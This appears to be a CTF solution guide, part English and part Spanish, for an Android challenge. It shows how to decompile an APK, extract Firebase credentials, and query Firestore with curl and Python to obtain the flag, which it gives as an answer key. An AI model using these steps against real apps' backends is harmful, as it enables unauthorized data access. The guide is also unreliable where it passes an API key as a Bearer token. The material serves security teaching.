# Challenge 05 - Mobile Security: Solution Guide

## 🎯 Challenge Overview

**Target**: MediCloudX Health Manager Android Application  
**Vulnerability**: Firebase Remote Config Data Exposure (CWE-200)  
**Attack Vector**: Static APK Analysis → Firebase Configuration Extraction → Remote Config Access  
**Flag Location**: Firebase Remote Config `admin_debug_token` parameter  

## 🔍 Vulnerability Analysis

### Primary Vulnerability: Firebase Configuration Exposure

**CWE-200: Information Exposure**

The application embeds Firebase API keys and configuration directly in the APK's string resources, making them accessible to anyone who can decompile the application.

**Impact**:
- Exposure of Firebase project credentials
- Unauthorized access to Firebase Remote Config
- Potential access to administrative configuration parameters
- Information disclosure of sensitive application settings

### Secondary Vulnerability: Sensitive Data in Remote Config

Firebase Remote Config is designed for application settings, not sensitive data storage. However, the application stores administrative tokens and debug information in publicly accessible Remote Config parameters.

## 🛠️ Step-by-Step Solution

### Step 1: APK Acquisition and Analysis

```bash
# Download the APK
curl -O https://storage.googleapis.com/medicloudx-mobile-apk-[suffix]/medicloudx-health-manager.apk

# Basic APK information
aapt dump badging medicloudx-health-manager.apk

# Extract basic metadata
unzip -l medicloudx-health-manager.apk | grep -E "(strings|google-services)"
```

### Step 2: APK Decompilation

#### Method 1: Using jadx (Recommended)

```bash
# Install jadx
# Download from: https://github.com/skylot/jadx/releases

# Decompile the APK
jadx -d medicloudx_decompiled medicloudx-health-manager.apk

# Navigate to resources
cd medicloudx_decompiled/resources/res/values/
cat strings.xml
```

#### Method 2: Using Android Studio APK Analyzer

1. Open Android Studio
2. Build → Analyze APK
3. Select `medicloudx-health-manager.apk`
4. Navigate to `res/values/strings.xml`

### Step 3: Firebase Configuration Extraction

**Location**: `res/values/strings.xml`

**Key Firebase Configuration Parameters**:

```xml
<string name="google_app_id" translatable="false">1:PROJECT_NUMBER:android:APP_ID</string>
<string name="gcm_defaultSenderId" translatable="false">PROJECT_NUMBER</string>
<string name="project_id" translatable="false">PROJECT_ID</string>
<string name="google_api_key" translatable="false">API_KEY</string>
<string name="firebase_database_url" translatable="false">https://PROJECT_ID-default-rtdb.firebaseio.com/</string>
<string name="google_storage_bucket" translatable="false">PROJECT_ID.appspot.com</string>
```

**Extract the following values**:
- `project_id`: Firebase project identifier
- `google_api_key`: API key for Firebase services
- `google_app_id`: Android app identifier
- `gcm_defaultSenderId`: Firebase Cloud Messaging sender ID

### Step 4: Firebase Firestore Access (Método Directo)

Una vez extraídos el API key y el nombre del proyecto del análisis del APK con jadx, puedes acceder directamente a la base de datos Firestore para obtener la flag:

#### Comando Directo para Obtener la Flag

```bash
# Usar los valores extraídos del APK
PROJECT_ID="arctic-bee-470901-c4"  # Extraído de strings.xml
API_KEY="AIzaSyBGKPKopYsBhYQmPfzZAlk_cHpv7MW8QWQ"  # Extraído de strings.xml

# Acceder a la colección 'config' en Firestore
curl "https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/config?key=${API_KEY}"
```

**Explicación de la URL**:
- `https://firestore.googleapis.com/v1/projects/`: Endpoint base de la API REST de Firestore
- `${PROJECT_ID}`: ID del proyecto Firebase extraído del APK
- `/databases/(default)/`: Base de datos por defecto (Firestore siempre usa "(default)" como nombre de base)
- `/documents/config`: Colección "config" donde se almacenan los parámetros de configuración
- `?key=${API_KEY}`: Autenticación usando el API key extraído

**¿Por qué "config" y "(default)"?**
- **"config"**: Es una convención común para almacenar configuraciones de aplicación en Firestore
- **"(default)"**: Firestore siempre crea una base de datos con el nombre "(default)" por defecto
- Estas son convenciones estándar en proyectos Firebase/Firestore

#### Respuesta Esperada

```json
{
  "documents": [
    {
      "name": "projects/arctic-bee-470901-c4/databases/(default)/documents/config/AsUH2sKAXkHDZaQNJdx3",
      "fields": {
        "admin_debug_token": {
          "stringValue": "CTF{m3d1cl0udx_m0b1l3_f1r3b4s3_r3m0t3_c0nf1g_83jrldhc}"
        },
        "backup_encryption_key": {
          "stringValue": "AES256_83jrldhc_BACKUP"
        },
        "theme_color": {
          "stringValue": "#4A90E2"
        }
      },
      "createTime": "2025-10-10T18:01:04.629511Z",
      "updateTime": "2025-10-10T18:01:04.629511Z"
    }
  ]
}
```

**🏆 Flag encontrada**: `CTF{m3d1cl0udx_m0b1l3_f1r3b4s3_r3m0t3_c0nf1g_83jrldhc}`

#### Método Alternativo: Using Python firebase-admin SDK

```python
#!/usr/bin/env python3
import requests
import json

# Configuration extracted from APK
FIREBASE_CONFIG = {
    "project_id": "arctic-bee-470901-c4",
    "api_key": "AIzaSyBGKPKopYsBhYQmPfzZAlk_cHpv7MW8QWQ"
}

# Firestore REST API endpoint
url = f"https://firestore.googleapis.com/v1/projects/{FIREBASE_CONFIG['project_id']}/databases/(default)/documents/config"

try:
    # Fetch config documents
    response = requests.get(url, params={"key": FIREBASE_CONFIG['api_key']})
    
    if response.status_code == 200:
        data = response.json()
        
        for doc in data.get('documents', []):
            fields = doc.get('fields', {})
            print(f"\n=== Document: {doc['name'].split('/')[-1]} ===")
            
            for field_name, field_data in fields.items():
                value = field_data.get('stringValue', '')
                print(f"{field_name}: {value}")
                
                # Check for flag
                if 'CTF{' in value:
                    print(f"\n🏆 FLAG FOUND: {value}")
    
    else:
        print(f"Error: {response.status_code} - {response.text}")
        
except Exception as e:
    print(f"Error accessing Firestore: {e}")
```

#### Method 2: Using Android Dummy Project

1. **Create New Android Project**:
   ```bash
   # Create minimal Android project structure
   mkdir firebase_exploit && cd firebase_exploit
   ```

2. **Configure Firebase**:
   ```xml
   <!-- res/values/strings.xml -->
   <resources>
       <string name="google_app_id" translatable="false">EXTRACTED_APP_ID</string>
       <string name="project_id" translatable="false">EXTRACTED_PROJECT_ID</string>
       <string name="google_api_key" translatable="false">EXTRACTED_API_KEY</string>
       <string name="gcm_defaultSenderId" translatable="false">EXTRACTED_SENDER_ID</string>
   </resources>
   ```

3. **Add Firebase Remote Config Code**:
   ```kotlin
   // MainActivity.kt
   import com.google.firebase.FirebaseApp
   import com.google.firebase.remoteconfig.FirebaseRemoteConfig
   
   class MainActivity : AppCompatActivity() {
       override fun onCreate(savedInstanceState: Bundle?) {
           super.onCreate(savedInstanceState)
           
           // Initialize Firebase
           FirebaseApp.initializeApp(this)
           
           // Get Remote Config instance
           val remoteConfig = FirebaseRemoteConfig.getInstance()
           
           // Fetch and activate
           remoteConfig.fetchAndActivate()
               .addOnCompleteListener { task ->
                   if (task.isSuccessful) {
                       // Log all Remote Config values
                       val allValues = remoteConfig.all
                       for ((key, value) in allValues) {
                           Log.d("RemoteConfig", "$key: ${value.asString()}")
                           
                           // Look for the flag
                           if (key.contains("admin") && value.asString().contains("CTF{")) {
                               Log.i("FLAG", "Found flag: ${value.asString()}")
                           }
                       }
                   }
               }
       }
   }
   ```

#### Method 3: Firebase Remote Config (Alternativo)

```bash
# Si necesitas acceder a Remote Config en lugar de Firestore
PROJECT_ID="arctic-bee-470901-c4"
API_KEY="AIzaSyBGKPKopYsBhYQmPfzZAlk_cHpv7MW8QWQ"

curl -X GET \
  "https://firebaseremoteconfig.googleapis.com/v1/projects/${PROJECT_ID}/remoteConfig" \
  -H "Authorization: Bearer ${API_KEY}" \
  -H "Content-Type: application/json"
```

### Step 5: Flag Extraction

**Expected Flag Location**: Firestore collection `config` document field `admin_debug_token`

**Flag Format**: `CTF{m3d1cl0udx_m0b1l3_f1r3b4s3_r3m0t3_c0nf1g_83jrldhc}`

**Ubicaciones Adicionales de Datos Sensibles**:
1. **Backup Encryption Key**: `backup_encryption_key` field en el mismo documento
2. **Theme Configuration**: `theme_color` field con configuración de UI
3. **Additional Config**: Otros documentos en la colección `config` pueden contener información sensible

### Step 6: Verification

```bash
# Verify flag format
echo "Found flag: CTF{m3d1cl0udx_m0b1l3_f1r3b4s3_r3m0t3_c0nf1g_xxxxxxxx}"

# Optional: Explore additional Firebase services
# - Firestore database
# - Firebase Authentication
# - Firebase Storage
```

## 🔧 Alternative Analysis Methods

### Method 1: APKTool Analysis

```bash
# Install apktool
apktool d medicloudx-health-manager.apk

# Navigate to resources
cd medicloudx-health-manager/res/values/
grep -r "google_api_key\|project_id\|firebase" .
```

### Method 2: MobSF (Mobile Security Framework)

```bash
# Upload APK to MobSF
# Navigate to Static Analysis
# Review "App Permissions" and "Network Security"
# Check "Secrets" section for hardcoded credentials
```

### Method 3: Reverse Engineering with Ghidra

```bash
# Convert APK to JAR
d2j-dex2jar medicloudx-health-manager.apk

# Load JAR in Ghidra
# Analyze string references
# Search for "firebase", "google_api_key", "remote_config"
```

## 📊 Technical Details

### Firebase Remote Config Structure

```json
{
  "parameterGroups": {
    "ui_settings": {
      "parameters": {
        "theme_color": {"defaultValue": {"value": "#4A90E2"}},
        "enable_dark_mode": {"defaultValue": {"value": "true"}}
      }
    },
    "admin_settings": {
      "parameters": {
        "admin_debug_token": {"defaultValue": {"value": "CTF{...}"}},
        "backup_encryption_key": {"defaultValue": {"value": "AES256_..."}}
      }
    }
  }
}
```

### Vulnerability Chain

1. **Information Disclosure** → Firebase config in APK
2. **Authentication Bypass** → Unrestricted API key usage
3. **Data Exposure** → Administrative parameters in Remote Config
4. **Privilege Escalation** → Access to sensitive configuration data

## 🛡️ Mitigation Strategies

### Immediate Fixes

1. **Remove Hardcoded Credentials**:
   ```kotlin
   // Bad
   val apiKey = "AIzaSyC-hardcoded-api-key"
   
   // Good
   val apiKey = BuildConfig.FIREBASE_API_KEY // From build-time configuration
   ```

2. **Restrict API Key Permissions**:
   ```bash
   # Google Cloud Console
   # APIs & Services → Credentials
   # Edit API Key → Application restrictions → Android apps
   # Add package name and SHA-1 certificate fingerprint
   ```

3. **Separate Sensitive Configuration**:
   ```json
   // Don't store sensitive data in Remote Config
   {
     "ui_theme": "dark",     // ✅ OK
     "api_endpoint": "...",  // ✅ OK  
     "admin_token": "..."    // ❌ NOT OK
   }
   ```

### Long-term Security Improvements

1. **Certificate Pinning**
2. **Code Obfuscation**
3. **Runtime Application Self-Protection (RASP)**
4. **Secure Key Management** with Android Keystore
5. **API Authentication** with user-specific tokens

## 📋 OWASP Mobile Top 10 Mapping

- **M2: Insecure Data Storage** - Firebase config in APK
- **M4: Insecure Authentication** - Unrestricted API access
- **M10: Extraneous Functionality** - Debug tokens in production

## 🎓 Learning Objectives

This challenge demonstrates:

1. **Static Analysis Techniques** for mobile applications
2. **Configuration Extraction** from compiled binaries
3. **Cloud Service Exploitation** via exposed credentials
4. **Information Gathering** from publicly accessible APIs
5. **Mobile Security Best Practices** and common pitfalls

## 🏆 Challenge Completion

**Success Criteria**:
- ✅ Successfully decompile the APK
- ✅ Extract Firebase configuration parameters
- ✅ Access Firebase Remote Config service
- ✅ Retrieve the flag from admin_debug_token parameter

**Flag Submission Format**: `CTF{m3d1cl0udx_m0b1l3_f1r3b4s3_r3m0t3_c0nf1g_[8-char-suffix]}`

---

## 📚 References

- [OWASP Mobile Security Testing Guide](https://owasp.org/www-project-mobile-security-testing-guide/)
- [Firebase Security Rules Documentation](https://firebase.google.com/docs/rules)
- [Android Application Security](https://developer.android.com/topic/security)
- [Static Analysis of Android Applications](https://github.com/MobSF/Mobile-Security-Framework-MobSF/wiki/1.-Documentation)

**Challenge Created by**: MediCloudX Security Team  
**Difficulty**: Medium  
**Category**: Mobile Security, Static Analysis, Cloud Configuration
